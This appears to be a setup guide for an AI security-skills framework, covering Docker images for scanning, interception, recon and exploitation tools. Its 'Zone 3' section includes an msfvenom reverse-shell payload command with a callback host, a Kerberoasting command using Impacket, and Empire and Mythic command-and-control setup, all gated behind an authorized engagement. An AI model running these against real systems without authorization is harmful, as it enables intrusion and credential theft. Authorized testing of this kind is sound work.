# How to Set Up Rainbow and Blue-Team Tools by Execution Tier

> Pull and verify each tool's Docker image for use in /rainbow and /blue-team security operations, organized by execution class and security zone.

<!-- Quality criteria: skills/diataxis/rules/diataxis-standards.md Section 1 (H-01 through H-07) -->
<!-- Anti-patterns avoided: HAP-01 (teaching), HAP-04 (edge-case exhaustion), HAP-05 (inline parameter tables) -->
<!-- Voice: Direct, action-oriented, efficient. See diataxis-standards.md Section 5. -->

## Document Sections

| Section | Purpose |
|---------|---------|
| [Before You Begin](#before-you-begin) | Requirements |
| [Execution Class A Tools](#execution-class-a-tools) | Direct CLI: Syft, Grype, Trivy, Nuclei, YARA-X, Checkov |
| [Execution Class B Tools](#execution-class-b-tools) | Environment-dependent: mitmproxy, Frida, Subfinder, httpx |
| [Zone 3 Tools](#zone-3-tools) | Exploitation: pwntools, Impacket, Empire, Mythic, Metasploit |
| [Verification Summary](#verification-summary) | Confirm all tools respond |
| [Troubleshooting](#troubleshooting) | Common setup failures |
| [Related](#related) | Next steps |

---

## Before You Begin

You need:

- Docker Engine >= 24.0 installed and running (`docker info` returns without error)
- At least 20 GB free disk space for all images
- Network access to pull from `ghcr.io` and `docker.io`
- For Zone 3 tools: an authorized engagement scope document already created (see the [Getting Started with /rainbow tutorial](../tutorials/getting-started-rainbow.md))

---

## Execution Class A Tools

Class A tools run as direct CLI invocations. Pull each image once and run it with a mounted working directory.

### Syft

Pull:

```bash
docker pull anchore/syft:v1.0.1
```

Verify:

```bash
docker run --rm anchore/syft:v1.0.1 version
```

Expected output contains `syft 1.0.1`.

Pin the image in your workflow by using the digest:

```bash
docker pull anchore/syft@sha256:$(docker inspect --format='{{index .RepoDigests 0}}' anchore/syft:v1.0.1 | cut -d@ -f2)
```

Run against a local directory:

```bash
docker run --rm -v "$(pwd)":/work anchore/syft:v1.0.1 scan /work -o cyclonedx-json=/work/sbom.json
```

### Grype

Pull:

```bash
docker pull anchore/grype:v0.74.0
```

Verify:

```bash
docker run --rm anchore/grype:v0.74.0 version
```

Expected output contains `grype 0.74.0`.

Run against an SBOM file:

```bash
docker run --rm -v "$(pwd)":/work anchore/grype:v0.74.0 sbom:/work/sbom.json --output json > vulns.json
```

### Trivy

Pull:

```bash
docker pull aquasec/trivy:0.50.0
```

Verify:

```bash
docker run --rm aquasec/trivy:0.50.0 version
```

Expected output contains `Version: 0.50.0`.

Run a container image scan:

```bash
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.50.0 \
  image --format json --output /tmp/trivy-results.json nginx:1.25-alpine
```

### Nuclei

Pull:

```bash
docker pull projectdiscovery/nuclei:v3.0.0
```

Verify:

```bash
docker run --rm projectdiscovery/nuclei:v3.0.0 -version
```

Expected output contains `nuclei v3.0.0`.

Run detection templates against a target list:

```bash
docker run --rm -v "$(pwd)":/work projectdiscovery/nuclei:v3.0.0 \
  -l /work/targets.txt -jsonl -o /work/nuclei-results.json
```

### YARA-X

Pull:

```bash
docker pull ghcr.io/virustotal/yara-x:latest
```

Pin to the current digest immediately after pulling:

```bash
docker pull ghcr.io/virustotal/yara-x@$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/virustotal/yara-x:latest | cut -d@ -f2 || echo "latest")
```

Verify:

```bash
docker run --rm ghcr.io/virustotal/yara-x:latest yr --version
```

Expected output contains `yr` followed by a version string.

Validate a rule file:

```bash
docker run --rm -v "$(pwd)":/work ghcr.io/virustotal/yara-x:latest \
  yr check /work/my-rule.yar
```

Scan a sample file:

```bash
docker run --rm -v "$(pwd)":/work ghcr.io/virustotal/yara-x:latest \
  yr scan /work/my-rule.yar /work/sample.bin
```

### Checkov

Pull:

```bash
docker pull bridgecrew/checkov:3.0.0
```

Verify:

```bash
docker run --rm bridgecrew/checkov:3.0.0 checkov --version
```

Expected output contains `3.0.0`.

Scan a Terraform directory:

```bash
docker run --rm -v "$(pwd)":/work bridgecrew/checkov:3.0.0 \
  checkov -d /work/terraform --framework terraform --output json
```

---

## Execution Class B Tools

Class B tools require network or device access. Docker images provide the binaries; routing the target traffic or attaching to a process requires additional host configuration.

### mitmproxy

Pull:

```bash
docker pull mitmproxy/mitmproxy:10.0.0
```

Verify:

```bash
docker run --rm mitmproxy/mitmproxy:10.0.0 mitmdump --version
```

Expected output contains `10.0.0`.

Run in regular proxy mode (listening on port 8080):

```bash
docker run --rm -p 8080:8080 \
  -v "$(pwd)/captures":/captures \
  mitmproxy/mitmproxy:10.0.0 \
  mitmdump -w /captures/capture.flow
```

Configure your browser or application to use `http://127.0.0.1:8080` as its proxy. Captured flows are written to `./captures/capture.flow`.

If you need transparent proxy mode, run the container with `--network host` and configure iptables redirect rules on the host before starting mitmdump.

### Frida

Pull:

```bash
docker pull frida/frida:16.0.0
```

Verify:

```bash
docker run --rm frida/frida:16.0.0 frida --version
```

Expected output contains `16.0.0`.

List processes on the host:

```bash
docker run --rm --pid=host --privileged frida/frida:16.0.0 frida-ps
```

Trace function calls in a host process (replace `1234` with your target PID):

```bash
docker run --rm --pid=host --privileged \
  -v "$(pwd)/scripts":/scripts \
  frida/frida:16.0.0 \
  frida-trace -p 1234 -i "recv*"
```

For Android device attachment, add `-v /dev/bus/usb:/dev/bus/usb --privileged` and use `-U` instead of `-p`.

### Subfinder

Pull:

```bash
docker pull projectdiscovery/subfinder:v2.6.0
```

Verify:

```bash
docker run --rm projectdiscovery/subfinder:v2.6.0 subfinder -version
```

Expected output contains `v2.6.0`.

Enumerate subdomains for an authorized domain:

```bash
docker run --rm -v "$(pwd)":/work projectdiscovery/subfinder:v2.6.0 \
  subfinder -d your-domain.example.com -oJ -o /work/subdomains.json
```

### httpx

Pull:

```bash
docker pull projectdiscovery/httpx:v1.6.0
```

Verify:

```bash
docker run --rm projectdiscovery/httpx:v1.6.0 httpx -version
```

Expected output contains `v1.6.0`.

Probe a list of hosts for live HTTP services:

```bash
docker run --rm -v "$(pwd)":/work projectdiscovery/httpx:v1.6.0 \
  httpx -l /work/subdomains.json -json -o /work/live-hosts.json
```

---

## Zone 3 Tools

Zone 3 tools require an authorized engagement scope document with `zone_3: true` and per-operation human approval for every operation. Do not pull or run these tools outside an authorized engagement.

### pwntools

Pull:

```bash
docker pull ghcr.io/gallopsled/pwntools:stable
```

Verify:

```bash
docker run --rm ghcr.io/gallopsled/pwntools:stable python3 -c "import pwn; print(pwn.__version__)"
```

Expected output is a version string such as `4.12.0`.

Run a pwntools script against an authorized target binary:

```bash
docker run --rm -v "$(pwd)":/work ghcr.io/gallopsled/pwntools:stable \
  python3 /work/exploit.py
```

### Impacket

Pull:

```bash
docker pull ghcr.io/fortra/impacket:latest
```

Pin to the current digest after pulling:

```bash
DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/fortra/impacket:latest)
echo "Pinned digest: $DIGEST"
```

Verify:

```bash
docker run --rm ghcr.io/fortra/impacket:latest impacket-smbclient --help 2>&1 | head -1
```

Expected output contains `Impacket`.

Run an Impacket module against an authorized AD target:

```bash
docker run --rm ghcr.io/fortra/impacket:latest \
  impacket-GetUserSPNs authorized-domain.local/user:password -dc-ip 10.0.0.1 -request
```

### Empire

Pull:

```bash
docker pull bcsecurity/empire:v5.0.0
```

Verify:

```bash
docker run --rm bcsecurity/empire:v5.0.0 empire-server --version
```

Expected output contains `5.0.0`.

Start the Empire server with an engagement-specific data directory:

```bash
docker run -d \
  --name empire-rbw-0001 \
  -p 1337:1337 \
  -v "$(pwd)/engagement-data":/empire/data \
  bcsecurity/empire:v5.0.0 \
  empire-server
```

Connect the Empire client to it:

```bash
docker run --rm -it --network host bcsecurity/empire:v5.0.0 \
  empire-client --host 127.0.0.1 --port 1337
```

### Mythic

Pull the Mythic CLI:

```bash
docker pull ghcr.io/its-a-feature/mythic:v3.3.0
```

Verify the CLI:

```bash
docker run --rm ghcr.io/its-a-feature/mythic:v3.3.0 ./mythic-cli version
```

Expected output contains `3.3.0`.

Initialize a Mythic deployment in an engagement directory:

```bash
mkdir -p mythic-rbw-0001 && cd mythic-rbw-0001
docker run --rm -v "$(pwd)":/mythic ghcr.io/its-a-feature/mythic:v3.3.0 ./mythic-cli install
docker run --rm -v "$(pwd)":/mythic ghcr.io/its-a-feature/mythic:v3.3.0 ./mythic-cli start
```

The Mythic web UI becomes available at `https://127.0.0.1:7443` after startup completes (approximately 60 seconds).

### Metasploit

Pull:

```bash
docker pull metasploitframework/metasploit-framework:6.4.0
```

Verify:

```bash
docker run --rm metasploitframework/metasploit-framework:6.4.0 msfconsole -x "version; exit"
```

Expected output contains `Framework: 6.4.0`.

Launch msfconsole with a mounted workspace:

```bash
docker run --rm -it \
  -v "$(pwd)/msf-workspace":/root/.msf4 \
  metasploitframework/metasploit-framework:6.4.0 \
  msfconsole
```

Generate a payload with msfvenom:

```bash
docker run --rm \
  -v "$(pwd)":/work \
  metasploitframework/metasploit-framework:6.4.0 \
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f elf -o /work/payload.elf
```

---

## Verification Summary

After pulling all tools, run this sequence to confirm each responds correctly:

```bash
docker run --rm anchore/syft:v1.0.1 version | grep -q "syft" && echo "syft: OK"
docker run --rm anchore/grype:v0.74.0 version | grep -q "grype" && echo "grype: OK"
docker run --rm aquasec/trivy:0.50.0 version | grep -q "0.50.0" && echo "trivy: OK"
docker run --rm projectdiscovery/nuclei:v3.0.0 -version 2>&1 | grep -q "nuclei" && echo "nuclei: OK"
docker run --rm ghcr.io/virustotal/yara-x:latest yr --version 2>&1 | grep -q "yr" && echo "yara-x: OK"
docker run --rm bridgecrew/checkov:3.0.0 checkov --version | grep -q "3.0" && echo "checkov: OK"
docker run --rm mitmproxy/mitmproxy:10.0.0 mitmdump --version | grep -q "10.0" && echo "mitmproxy: OK"
docker run --rm projectdiscovery/subfinder:v2.6.0 subfinder -version 2>&1 | grep -q "v2.6" && echo "subfinder: OK"
docker run --rm projectdiscovery/httpx:v1.6.0 httpx -version 2>&1 | grep -q "v1.6" && echo "httpx: OK"
```

Each line prints `OK` on success. A line that produces no output or an error means the image did not pull correctly; re-run the corresponding pull command.

---

## Troubleshooting

**Problem:** `docker pull` fails with `unauthorized` or `not found`.
**Solution:** Ensure you are logged into the registry. Run `docker login ghcr.io` for GitHub Container Registry images.

**Problem:** `docker run` fails with `permission denied` accessing `/var/run/docker.sock` (Trivy).
**Solution:** Add your user to the `docker` group: `sudo usermod -aG docker $USER`, then log out and back in.

**Problem:** Frida `frida-ps` shows no processes or fails to attach.
**Solution:** The container needs `--pid=host --privileged`. Verify both flags are present in your `docker run` command. On macOS, Frida requires the target process to run in the same host network namespace.

**Problem:** mitmproxy does not capture traffic even though the proxy is listening.
**Solution:** Configure your client explicitly to use `http://127.0.0.1:8080`. Transparent mode requires host-level iptables rules outside the container; see the mitmproxy documentation at `https://docs.mitmproxy.org/stable/concepts-modes/`.

**Problem:** Checkov exits with no findings on a non-empty directory.
**Solution:** Confirm the `--framework` flag matches your IaC type. Run `checkov --list` to see all supported frameworks.

---

## Related

- **Tutorial:** [Learn to run a security assessment with /rainbow](../tutorials/getting-started-rainbow.md) -- Use these tools in a full engagement workflow
- **Tutorial:** [Learn to detect threats with /blue-team](../tutorials/getting-started-blue-team.md) -- Use YARA-X and Checkov in a defensive assessment
- **Reference:** [Rainbow SKILL.md](../../skills/rainbow/SKILL.md) -- Tool inventory organized by sub-skill and security zone
- **Reference:** [Blue Team SKILL.md](../../skills/blue-team/SKILL.md) -- Tool inventory with Tier A/B/C classification
